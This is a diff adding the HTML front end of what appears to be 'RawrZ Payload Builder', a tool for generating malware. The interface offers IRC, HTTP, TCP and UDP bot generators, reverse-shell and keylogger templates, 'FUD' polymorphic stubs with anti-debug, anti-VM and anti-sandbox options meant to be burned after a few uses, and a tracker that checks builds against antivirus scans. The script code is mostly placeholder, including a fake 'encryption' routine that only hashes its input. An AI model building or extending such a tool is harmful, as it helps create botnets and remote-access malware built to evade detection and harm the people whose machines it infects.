@@ -1,0 +1,491 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RawrZ Payload Builder - UNLEASHED</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="stylesheet" href="styles/engine-styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🔥 RawrZ Payload Builder - UNLEASHED 🔥</h1>
+            <p>Advanced Security Tools & Payload Generation Platform</p>
+        </div>
+
+        <div class="stats-grid">
+            <div class="stat-card">
+                <div class="stat-number" id="totalEngines">139</div>
+                <div class="stat-label">Total Engines</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="loadedEngines">0</div>
+                <div class="stat-label">Loaded Engines</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="activeOperations">0</div>
+                <div class="stat-label">Active Operations</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="generatedPayloads">0</div>
+                <div class="stat-label">Generated Payloads</div>
+            </div>
+        </div>
+
+        <div class="main-content">
+            <div class="sidebar">
+                <h3>Payload Generation</h3>
+                <div class="generator-section">
+                    <h4>Output Format</h4>
+                    <select id="outputFormat">
+                        <option value="exe">Windows EXE</option>
+                        <option value="elf">Linux ELF</option>
+                        <option value="mach-o">macOS Mach-O</option>
+                        <option value="dll">Windows DLL</option>
+                        <option value="so">Linux SO</option>
+                        <option value="dylib">macOS DYLIB</option>
+                        <option value="scr">Windows SCR</option>
+                        <option value="com">DOS COM</option>
+                        <option value="bin">Raw Binary</option>
+                        <option value="hex">Intel HEX</option>
+                        <option value="srec">Motorola S-Record</option>
+                        <option value="uf2">UF2 Format</option>
+                        <option value="jar">Java JAR</option>
+                        <option value="class">Java CLASS</option>
+                        <option value="dex">Android DEX</option>
+                        <option value="apk">Android APK</option>
+                        <option value="ipa">iOS IPA</option>
+                        <option value="app">macOS APP</option>
+                        <option value="msi">Windows MSI</option>
+                        <option value="deb">Debian DEB</option>
+                        <option value="rpm">RedHat RPM</option>
+                        <option value="pkg">macOS PKG</option>
+                        <option value="dmg">macOS DMG</option>
+                        <option value="iso">ISO Image</option>
+                        <option value="vhd">Virtual Hard Disk</option>
+                    </select>
+
+                    <h4>Bot Type</h4>
+                    <div class="bot-options">
+                        <button id="ircBotGen" class="btn btn-primary">Generate IRC Bot</button>
+                        <button id="httpBotGen" class="btn btn-primary">Generate HTTP Bot</button>
+                        <button id="tcpBotGen" class="btn btn-primary">Generate TCP Bot</button>
+                        <button id="udpBotGen" class="btn btn-primary">Generate UDP Bot</button>
+                    </div>
+
+                    <h4>Encryption</h4>
+                    <label><input type="checkbox" id="useFileSSL" checked> Use FileSSL</label>
+                    <label><input type="checkbox" id="useAdvancedCrypto"> Advanced Crypto</label>
+                    <label><input type="checkbox" id="usePolymorphic"> Polymorphic</label>
+                    <label><input type="checkbox" id="useAntiAnalysis"> Anti-Analysis</label>
+                </div>
+            </div>
+
+            <div class="workspace">
+                <div class="tab-container">
+                    <button class="tab active" data-tab="files">File Operations</button>
+                    <button class="tab" data-tab="engines">Engine Control</button>
+                    <button class="tab" data-tab="payloads">Payload Builder</button>
+                </div>
+
+                <div id="files" class="tab-content active">
+                    <h3>File Operations</h3>
+                    <div class="file-controls">
+                        <button id="selectFile">Select File</button>
+                        <button id="selectFiles">Select Multiple Files</button>
+                        <button id="selectDir">Select Directory</button>
+                    </div>
+                    <div class="file-ops">
+                        <button id="hashBtn">Hash File</button>
+                        <button id="compressBtn">Compress</button>
+                        <button id="decompressBtn">Decompress</button>
+                        <button id="createArchiveBtn">Create Archive</button>
+                        <button id="extractArchiveBtn">Extract Archive</button>
+                        <button id="encryptFileBtn">Encrypt File</button>
+                        <button id="decryptFileBtn">Decrypt File</button>
+                    </div>
+
+                    <div class="jotti-section">
+                        <h4>🛡️ Jotti FUD Tracker</h4>
+                        <textarea id="jottiInput" placeholder="Paste Jotti scan results here..." rows="4"></textarea>
+                        <div class="jotti-controls">
+                            <button id="parseJottiBtn">Parse Results</button>
+                            <button id="clearJottiBtn">Clear</button>
+                        </div>
+                        <div id="jottiResults" class="jotti-results"></div>
+                        <div class="jotti-tip">💡 Tip: Copy/paste results from <a href="https://virusscan.jotti.org"
+                                target="_blank">virusscan.jotti.org</a></div>
+                    </div>
+                </div>
+
+                <div id="engines" class="tab-content">
+                    <h3>🔧 Dynamic Engine System</h3>
+                    <div class="engine-controls">
+                        <button id="loadEngines" class="btn btn-primary">Load All Engines</button>
+                    </div>
+                    <div id="engineStats">Loading engines...</div>
+                    <div id="engineToggles"></div>
+                    <div id="engineMenus"></div>
+                    <div id="engineList" class="engine-grid">
+                        <div class="engine-card">
+                            <h4>🏗️ FUD Stub Generator</h4>
+                            <p>Reusable polymorphic stubs - burn after 2-3 uses</p>
+                            <div class="stub-status" id="stubStatus">Stubs: 5 Active | 0 Burned</div>
+                            <div class="engine-controls">
+                                <button class="btn btn-primary" onclick="generateStubs()">Generate Stubs</button>
+                                <button class="btn btn-secondary"
+                                    onclick="showEngineMenu('stub-generator')">Configure</button>
+                            </div>
+                            <button class="btn btn-success" onclick="useStub()">Use Next Stub</button>
+                            <button class="btn btn-danger" onclick="burnCurrentStub()">Burn Current Stub</button>
+                            <button class="btn btn-warning" onclick="checkStubStatus()">Check Status</button>
+                        </div>
+                        <div class="engine-card">
+                            <h4>🔄 Polymorphic Engine</h4>
+                            <p>Dynamic code mutation and obfuscation</p>
+                            <button class="btn btn-primary" onclick="runPolymorphicEngine()">Run Polymorphic</button>
+                            <button class="btn btn-warning" onclick="mutateCode()">Mutate Code</button>
+                        </div>
+                        <div class="engine-card">
+                            <h4>🛡️ Anti-Analysis</h4>
+                            <p>VM detection and debugging protection</p>
+                            <button class="btn btn-danger" onclick="enableAntiAnalysis()">Enable Protection</button>
+                            <button class="btn btn-primary" onclick="testAntiAnalysis()">Test Protection</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="payloads" class="tab-content">
+                    <h3>Payload Builder</h3>
+
+                    <!-- Stub Generator Section -->
+                    <div class="stub-generator">
+                        <h4>🔥 Stub Generator</h4>
+                        <div class="stub-config">
+                            <div class="config-row">
+                                <label>Payload File:</label>
+                                <input type="text" id="stubPayloadPath" placeholder="Select payload file..." readonly>
+                                <button id="browsePayload" class="btn btn-secondary">Browse</button>
+                            </div>
+                            <div class="config-row">
+                                <label>Stub Type:</label>
+                                <select id="stubType">
+                                    <option value="cpp">C++ (.cpp)</option>
+                                    <option value="csharp">C# (.cs)</option>
+                                    <option value="python">Python (.py)</option>
+                                    <option value="powershell">PowerShell (.ps1)</option>
+                                    <option value="java">Java (.java)</option>
+                                    <option value="go">Go (.go)</option>
+                                    <option value="rust">Rust (.rs)</option>
+                                    <option value="javascript">JavaScript (.js)</option>
+                                    <option value="asm">Assembly (.asm)</option>
+                                    <option value="advanced">Advanced (.exe)</option>
+                                </select>
+                            </div>
+                            <div class="config-row">
+                                <label>Encryption:</label>
+                                <select id="stubEncryption">
+                                    <option value="aes-256-gcm">AES-256-GCM</option>
+                                    <option value="aes-256-cbc">AES-256-CBC</option>
+                                    <option value="chacha20">ChaCha20-Poly1305</option>
+                                    <option value="hybrid">Hybrid Encryption</option>
+                                    <option value="triple">Triple Layer</option>
+                                </select>
+                            </div>
+                            <div class="config-row">
+                                <label>Output Path:</label>
+                                <input type="text" id="stubOutputPath" placeholder="Output file path..." readonly>
+                                <button id="browseOutput" class="btn btn-secondary">Save As</button>
+                            </div>
+                            <div class="config-row">
+                                <label>Anti-Analysis:</label>
+                                <div class="checkbox-group">
+                                    <label><input type="checkbox" id="antiDebug" checked> Anti-Debug</label>
+                                    <label><input type="checkbox" id="antiVM" checked> Anti-VM</label>
+                                    <label><input type="checkbox" id="antiSandbox" checked> Anti-Sandbox</label>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="stub-controls">
+                            <button id="testButton" class="btn btn-warning"
+                                onclick="log('🧪 Test button clicked!')">TEST</button>
+                            <button id="generateStub" class="btn btn-success">Generate Stub</button>
+                            <button id="clearStubConfig" class="btn btn-secondary">Clear</button>
+                        </div>
+                    </div>
+
+                    <hr>
+
+                    <!-- Original Payload Builder -->
+                    <div class="payload-builder">
+                        <div class="payload-config">
+                            <h4>Configuration</h4>
+                            <input type="text" id="payloadName" placeholder="Payload Name">
+                            <textarea id="payloadCode" placeholder="Enter payload code or select template"></textarea>
+                            <div class="template-buttons">
+                                <button id="ircTemplate">IRC Bot Template</button>
+                                <button id="httpTemplate">HTTP Bot Template</button>
+                                <button id="reverseShellTemplate">Reverse Shell Template</button>
+                                <button id="keyloggerTemplate">Keylogger Template</button>
+                            </div>
+                        </div>
+                        <div class="build-controls">
+                            <button id="buildPayload" class="btn btn-success">Build Payload</button>
+                            <button id="testPayload" class="btn btn-warning">Test Payload</button>
+                            <button id="downloadPayload" class="btn btn-primary">Download</button>
+                        </div>
+                    </div>
+                    
+                    <hr>
+                    
+                    <!-- Crypto Operations -->
+                    <div class="crypto-section">
+                        <h4>🔐 Crypto Operations</h4>
+                        <div class="crypto-inputs">
+                            <input type="text" id="textInput" placeholder="Enter text to encrypt/decrypt">
+                            <input type="password" id="password" placeholder="Enter password">
+                        </div>
+                        <div class="crypto-controls">
+                            <button id="encryptBtn" class="btn btn-primary">Encrypt</button>
+                            <button id="decryptBtn" class="btn btn-secondary">Decrypt</button>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="output">
+                    <h4>Output Console</h4>
+                    <pre id="output"></pre>
+                    <div class="output-controls">
+                        <button id="clearOutput">Clear</button>
+                        <button id="saveOutput">Save Log</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Electron API with fallback implementations for browser testing
+        window.electronAPI = {
+            selectFile: async () => {
+                return new Promise((resolve) => {
+                    const input = document.createElement('input');
+                    input.type = 'file';
+                    input.onchange = (e) => {
+                        const file = e.target.files[0];
+                        resolve(file ? file.path || file.name : null);
+                    };
+                    input.click();
+                });
+            },
+            selectFiles: async () => {
+                return new Promise((resolve) => {
+                    const input = document.createElement('input');
+                    input.type = 'file';
+                    input.multiple = true;
+                    input.onchange = (e) => {
+                        const files = Array.from(e.target.files).map(f => f.path || f.name);
+                        resolve(files);
+                    };
+                    input.click();
+                });
+            },
+            selectDirectory: async () => {
+                return new Promise((resolve) => {
+                    const input = document.createElement('input');
+                    input.type = 'file';
+                    input.webkitdirectory = true;
+                    input.onchange = (e) => {
+                        const files = Array.from(e.target.files);
+                        const dir = files.length > 0 ? files[0].webkitRelativePath.split('/')[0] : null;
+                        resolve(dir);
+                    };
+                    input.click();
+                });
+            },
+            hashFile: async (filePath) => {
+                // Simple hash implementation for demo
+                let hash = 0;
+                for (let i = 0; i < filePath.length; i++) {
+                    const char = filePath.charCodeAt(i);
+                    hash = ((hash << 5) - hash) + char;
+                    hash = hash & hash; // Convert to 32-bit integer
+                }
+                return Math.abs(hash).toString(16).padStart(8, '0');
+            },
+            executeEngine: async (engineName, params) => {
+                console.log(`Executing engine: ${engineName}`, params);
+                return `Engine ${engineName} executed successfully with params: ${JSON.stringify(params)}`;
+            }
+        };
+
+        // Try to load Electron API if available
+        if (typeof require !== 'undefined') {
+            try {
+                const { ipcRenderer } = require('electron');
+                window.electronAPI = {
+                    selectFile: () => ipcRenderer.invoke('select-file'),
+                    selectFiles: () => ipcRenderer.invoke('select-files'),
+                    selectDirectory: () => ipcRenderer.invoke('select-directory'),
+                    hashFile: (filePath) => ipcRenderer.invoke('hash-file', filePath),
+                    executeEngine: (name, params) => ipcRenderer.invoke('execute-engine', name, params)
+                };
+            } catch (e) {
+                console.log('Electron not available, using browser fallbacks');
+            }
+        }
+    </script>
+    <script src="engines/engine-config.js"></script>
+    <script src="engine-manager.js"></script>
+    <script src="renderer.js"></script>
+
+    <!-- RawrZ Crypto Library -->
+    <script>
+    // Simple crypto implementation for demo purposes
+    window.rawrz = {
+        async encryptTextDemo(text, password, method = 'aes-256-gcm') {
+            // Simple demo encryption - in real implementation, use proper crypto
+            const encoder = new TextEncoder();
+            const data = encoder.encode(text + password);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+            const hashArray = Array.from(new Uint8Array(hashBuffer));
+            const hashHex = hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+            
+            return {
+                method: method,
+                cipherTextHex: hashHex.substring(0, 32),
+                keyHex: hashHex.substring(32),
+                success: true
+            };
+        },
+        
+        async decryptTextDemo(cipherText, password, method = 'aes-256-gcm') {
+            // Simple demo decryption - in real implementation, use proper crypto
+            try {
+                // For demo, just return a decoded message
+                const decoded = atob(cipherText || '');
+                return decoded || 'Demo decrypted text';
+            } catch (e) {
+                return 'Decryption failed - demo mode';
+            }
+        }
+    };
+    </script>
+
+    <!-- BigDaddyG Auto-Connection Script -->
+    <script>
+        (function () {
+            console.log('🔗 BigDaddyG Auto-Connection loading...');
+
+            // Auto-connection configuration
+            const config = {
+                mainServer: 'http://localhost:3000',
+                websocket: 'ws://localhost:8001',
+                fallback: 'http://localhost:3003',
+                timeout: 5000
+            };
+
+            // Connection manager
+            class BigDaddyGConnection {
+                constructor() {
+                    this.connected = false;
+                    this.fallbackMode = false;
+                    this.ws = null;
+                    this.retryCount = 0;
+                    this.maxRetries = 3;
+                }
+
+                async connect() {
+                    try {
+                        // Try main WebSocket first
+                        await this.connectWebSocket();
+                    } catch (error) {
+                        console.log('⚠️ Main connection failed, trying fallback...');
+                        await this.connectFallback();
+                    }
+                }
+
+                async connectWebSocket() {
+                    return new Promise((resolve, reject) => {
+                        this.ws = new WebSocket(config.websocket);
+
+                        this.ws.onopen = () => {
+                            console.log('✅ Connected to BigDaddyG WebSocket');
+                            this.connected = true;
+                            this.fallbackMode = false;
+                            resolve();
+                        };
+
+                        this.ws.onerror = (error) => {
+                            console.log('❌ WebSocket connection failed:', error);
+                            reject(error);
+                        };
+
+                        this.ws.onclose = () => {
+                            this.connected = false;
+                            if (this.retryCount < this.maxRetries) {
+                                this.retryCount++;
+                                console.log(`🔄 Retrying connection (${this.retryCount}/${this.maxRetries})...`);
+                                setTimeout(() => this.connect(), 2000);
+                            }
+                        };
+
+                        // Timeout
+                        setTimeout(() => {
+                            if (!this.connected) {
+                                this.ws.close();
+                                reject(new Error('Connection timeout'));
+                            }
+                        }, config.timeout);
+                    });
+                }
+
+                async connectFallback() {
+                    try {
+                        const response = await fetch(config.fallback + '/api/fallback/status');
+                        const data = await response.json();
+                        console.log('✅ Connected to BigDaddyG Fallback mode');
+                        this.connected = true;
+                        this.fallbackMode = true;
+                    } catch (error) {
+                        console.log('❌ Fallback connection also failed:', error);
+                        throw error;
+                    }
+                }
+
+                send(message) {
+                    if (this.connected && !this.fallbackMode && this.ws) {
+                        this.ws.send(JSON.stringify(message));
+                    } else if (this.fallbackMode) {
+                        // Handle fallback mode
+                        this.handleFallbackMessage(message);
+                    }
+                }
+
+                handleFallbackMessage(message) {
+                    console.log('📤 Fallback mode - message:', message);
+                    // Implement fallback message handling
+                }
+            }
+
+            // Initialize connection
+            window.BigDaddyGConnection = new BigDaddyGConnection();
+            window.BigDaddyGConnection.connect();
+
+            // Global functions for easy use
+            window.bigdaddyg = {
+                send: (msg) => window.BigDaddyGConnection.send(msg),
+                connected: () => window.BigDaddyGConnection.connected,
+                fallback: () => window.BigDaddyGConnection.fallbackMode
+            };
+
+            console.log('🎉 BigDaddyG Auto-Connection ready!');
+        })();
+    </script>
+    <!-- End BigDaddyG Auto-Connection Script -->
+</body>
+
+</html>
